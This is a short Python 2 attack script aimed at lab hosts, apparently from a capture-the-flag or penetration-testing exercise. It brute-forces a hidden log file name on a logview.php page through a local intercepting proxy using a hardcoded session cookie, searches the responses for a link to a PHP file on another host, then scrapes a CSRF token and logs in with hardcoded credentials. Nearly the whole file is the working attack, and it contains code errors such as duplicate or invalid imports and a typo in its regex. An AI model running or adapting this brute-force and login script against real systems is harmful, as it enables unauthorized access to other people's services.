import itertools
from itertools import product
import string
import urllib
import urllib2
import re
import time
import sys
import os
import request
from bs4 import BeautifulSoup
import BeautifulSoup
from BeautifulSoup import BeautifulSoup

#opener = urllib2.build_opener()
#f = opener.open("http://example.com/")
# Set password complexity - remove string character sets not required
chars = "abcdef0123456789"
# Set max password length to crack - change 10 to desired length 
proxy = urllib2.ProxyHandler({'http': '127.0.0.1:8080'})
opener = urllib2.build_opener(proxy)
urllib2.install_opener(opener)
opener.addheaders.append(('Cookie', 'synpi_session_id=xnlg'))

for guess in itertools.product((chars), repeat=2):
	i = ''.join(guess)
	# Set user name to crack - change username within single quotes to desired username
	postdata = urllib.urlencode({'submit': 'View+Log+File','logfile': 'de6a37b3343ce3d0c2f6c0a64c7ce26eca6fa1deeac661d6130c'+str(i)})
	#uncomment below to debug post data 
	#print postdata
	# Set URL to page receiving login POST data - Change url within single quotes 
	content = urllib2.urlopen('http://10.2.2.1:7779/logview.php',postdata).read()
	#uncomment below to debug returned content 
	#print content
	matches = re.findall(r'lttp://10\.2\.2\.1:8000/a\.php', content)
	#uncomment below to debug regex query
	#print matches
	if len(matches) > 0:
	#uncomment below to debug attempted passwords
		print "\n\nlog file is - " + i
		#uncomment below to throttle down script speed - change sleep timer as needed
		time.sleep(0.1)
		break
	else:
		print i + " - is not the string"
		continue
		
#de6a37b3343ce3d0c2f6c0a64c7ce2

soup = BeautifulSoup(content)
print soup.find('input', {'name':'user_token'}).attrs[2][1]
csrf=str(soup.find('input', {'name':'user_token'}).attrs[2][1])
postdata = urllib.urlencode({'username': 'bob','password': 'lanyard','Login': 'Login','user_token': csrf})
content2 = urllib2.urlopen('http://10.25.5.9/login.php',postdata).read()